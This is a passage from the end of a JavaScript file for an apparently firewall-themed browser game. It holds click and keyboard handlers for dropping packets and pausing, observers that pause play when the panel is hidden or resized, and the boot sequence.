    var chip = e.target.closest('.fw-chip');
    if (chip && el.field.contains(chip)) { dropPacket(packetFromNode(chip)); return; }
    var act = e.target.closest('[data-action]');
    if (!act) return;
    var action = act.dataset.action;
    if (action === 'start') startGame();
    else if (action === 'resume') resumeGame();
    else if (action === 'pause') { if (state.phase === 'paused') resumeGame(); else pauseGame(false); }
  }

  function onKey(e) {
    if (e.ctrlKey || e.metaKey || e.altKey) return;
    var key = e.key.toLowerCase();
    if (key === 'd' && state.phase === 'running') { e.preventDefault(); dropPacket(frontPacket()); }
    else if (key === 'p' || (key === 'escape' && state.phase === 'running')) {
      if (state.phase === 'running') { e.preventDefault(); pauseGame(false); }
      else if (state.phase === 'paused') { e.preventDefault(); resumeGame(); }
    }
  }

  function watchVisibility() {
    document.addEventListener('visibilitychange', function () { if (document.hidden) pauseGame(true); });
    if (!('IntersectionObserver' in window)) return;
    var io = new IntersectionObserver(function (entries) {
      entries.forEach(function (en) { if (en.intersectionRatio < VISIBLE_RATIO) pauseGame(true); });
    }, { threshold: [0, VISIBLE_RATIO, 1] });
    io.observe(el.panel);
  }

  function watchResize() {
    if ('ResizeObserver' in window) new ResizeObserver(measureLayout).observe(el.panel);
    else window.addEventListener('resize', measureLayout);
  }

  /* ---------- Boot ---------- */
  root.addEventListener('click', onClick);
  root.addEventListener('keydown', onKey);
  watchVisibility();
  watchResize();
  measureLayout();
  updateHud();
  startScreen();
})();
